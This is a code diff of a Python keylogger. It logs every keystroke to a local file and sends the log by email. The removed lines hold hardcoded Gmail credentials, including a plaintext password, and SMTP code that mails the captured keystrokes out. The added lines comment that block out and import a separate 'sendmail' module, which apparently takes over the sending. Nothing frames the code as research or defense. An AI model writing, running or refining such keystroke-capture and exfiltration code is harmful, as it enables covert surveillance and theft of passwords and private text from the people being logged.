@@ -1,14 +1,15 @@
 from pynput import keyboard
 from pynput.keyboard import Key,Listener
-import smtplib,ssl,keylogger
-sender_mail = "atabcd2324@gmail.com"     
-receiver_mail = "atabcd2324@gmail.com"  
-password ="ni8dreams"              
-port = 58
-message = """From: atabcd2324@gmail.com
-To: atabcd2324@gmail.com                         
-Subject: KeyLogs
-Text: Keylogs """
+import keylogger
+import sendmail
+# sender_mail = "user@domain.com"     
+# receiver_mail = "userdomain@gmail.com"  
+# password ="mail-password"              
+# port = 58
+# message = """From: user@domain@gmail.com
+# To: user@domain@gmail.com                         
+# Subject: KeyLogs
+# Text: Keylogs """
 def write(text):
     with open("keylogger.txt",'a') as f:
         f.write(text)
@@ -16,7 +17,7 @@ def write(text):
 def on_key_press(Key):
     try:
         if(Key == keyboard.Key.enter):
-            write("\n")
+            write("\nenter Pressed")
         else:
             write(Key.char)
     except AttributeError:
@@ -25,7 +26,7 @@ def on_key_press(Key):
         elif(Key == keyboard.Key.tab):
             write("\nTab Pressed\n")
         elif(Key == keyboard.Key.space):
-            write(" ")
+            write("\nSpace Pressed\n")
         else:
             temp = repr(Key)+" Pressed.\n"
             write(temp)
@@ -39,10 +40,12 @@ with open("keylogger.txt",'r') as f:
     temp = f.read()
     message = message + str(temp)
     f.close()
-context = ssl.create_default_context()
-server = smtplib.SMTP('smtp.gmail.com', port)
-server.starttls()
-server.login(sender_mail,password)
-server.sendmail(sender_mail,receiver_mail,message)
-print("Email Sent to ",sender_mail)
-server.quit()
+# context = ssl.create_default_context()
+# server = smtplib.SMTP('smtp.gmail.com', port)
+# server.ehlo()
+# server.starttls(context=context)
+# server.ehlo()
+# server.login(sender_mail,password)
+# server.sendmail(sender_mail,receiver_mail,message)
+# print("Email Sent to ",sender_mail)
+# server.quit()
